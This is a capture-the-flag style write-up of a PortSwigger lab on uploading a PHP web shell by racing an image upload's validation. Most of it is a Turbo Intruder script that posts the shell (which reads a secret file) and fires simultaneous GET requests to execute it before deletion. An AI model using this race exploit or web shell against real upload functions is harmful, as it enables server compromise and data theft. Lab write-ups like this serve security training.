# Lab: Web shell upload via race condition

>This lab contains a vulnerable image upload function. Although it performs robust validation on any files that are uploaded, it is possible to bypass this validation entirely by exploiting a race condition in the way it processes them.

>To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner.

>You can log in to your own account using the following credentials: wiener:peter

### Observations
To my understanding a race condition is a sort of "timing attack". In order to analyze a file, it must first be downloaded or stored in memory. What if I can create a large file and read it before the validation completes (and therefore removes the file from the filesystem)

### Next steps
After some tinkering, I decided to install burp turbo-intruder. I found some template scripts for burp turbo-intruder here https://github.com/PortSwigger/turbo-intruder/tree/master/resources/examples

I will use `race.py` to build off of

<pre>
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=100,
                           pipeline=False
                           )

    # the 'gate' argument blocks the final byte of each request until openGate is invoked
    for i in range(30):
        engine.queue(target.req, target.baseInput, gate='race1')

    # wait until every 'race1' tagged request is ready
    # then send the final byte of each request
    # (this method is non-blocking, just like queue)
    engine.openGate('race1')

    engine.complete(timeout=60)


def handleResponse(req, interesting):
    table.add(req)
</pre>

**I followed the solution of this lab to get a better understanding of Turbo Intruder**


See the official solution here https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-race-condition

I followed the above instructions and was able to get the secret. I got held up for a bit because when copying my GET and POST requests, I did not include `\r\n\r\n` (press enter 2 times) at the end of each request

### My final code for turbo intruder
<pre>
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=10,
                           )
                           
    request1 = '''POST /my-account/avatar HTTP/1.1
Host: acf01fc51f237523c05c1810009000f2.web-security-academy.net
Cookie: session=ZgCH0rGHfGMb37IRB5DR5QpRMI2W1Xm4
Content-Length: 457
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="97", " Not;A Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Upgrade-Insecure-Requests: 1
Origin: https://acf01fc51f237523c05c1810009000f2.web-security-academy.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryXhGJnKbJDv4nei6C
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://acf01fc51f237523c05c1810009000f2.web-security-academy.net/my-account
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

------WebKitFormBoundaryXhGJnKbJDv4nei6C
Content-Disposition: form-data; name="avatar"; filename="lab6.php"
Content-Type: text/php

<?php echo file_get_contents('/home/carlos/secret');?>

------WebKitFormBoundaryXhGJnKbJDv4nei6C
Content-Disposition: form-data; name="user"

wiener
------WebKitFormBoundaryXhGJnKbJDv4nei6C
Content-Disposition: form-data; name="csrf"

6Zc60QAyUce5x0sS3QxsM9UlIdo7VegO
------WebKitFormBoundaryXhGJnKbJDv4nei6C--

'''

    request2 = '''GET /files/avatars/lab6.php HTTP/1.1
Host: acf01fc51f237523c05c1810009000f2.web-security-academy.net
Cookie: session=ZgCH0rGHfGMb37IRB5DR5QpRMI2W1Xm4
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="97", " Not;A Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

'''

    engine.queue(request1, gate='race1')
    for x in range(5):
        engine.queue(request2, gate='race1')

    engine.openGate('race1')
    engine.complete(timeout=60)
   
def handleResponse(req, interesting):
    table.add(req)

</pre>